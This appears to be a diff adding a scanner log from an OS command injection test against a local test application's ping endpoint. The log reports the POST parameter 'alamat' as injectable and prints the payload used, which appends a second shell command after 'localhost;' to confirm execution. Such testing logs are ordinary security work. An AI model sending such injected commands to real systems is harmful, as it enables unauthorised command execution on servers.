@@ -1,0 +1,9 @@
+
+=====================================
+| Started in 2026-11-04 at 12:12:08 |
+=====================================
+[info] Tested URL : http://testapp:8080/alat/ping
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (POST) alamat
+[info] Used payload: localhost;echo QVZKKN$((94%2B66))$(echo QVZKKN)QVZKKN;
